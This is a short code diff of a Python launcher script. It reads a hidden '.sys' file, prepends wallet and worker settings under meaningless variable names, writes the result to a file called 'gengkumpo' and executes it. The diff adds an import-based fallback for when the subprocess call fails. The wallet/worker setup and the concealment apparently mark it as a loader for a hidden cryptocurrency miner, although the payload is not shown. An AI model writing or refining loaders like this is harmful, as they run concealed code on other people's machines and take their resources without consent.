@@ -1,5 +1,5 @@
 import base64 as b
-from subprocess import run
+import subprocess
 s=wallet=worker=''
 with open('.sys','r') as file:
     s = file.read()
@@ -17,4 +17,7 @@ fulltext = 'asucok="'+wallet+'"\nwanjeng="'+worker+'"\n'+s
 f = open("gengkumpo", "w")
 f.write(fulltext)
 f.close()
-run(["python",f.name])
+try:
+    subprocess.run(["python",f.name])
+except:
+    import gengkumpo
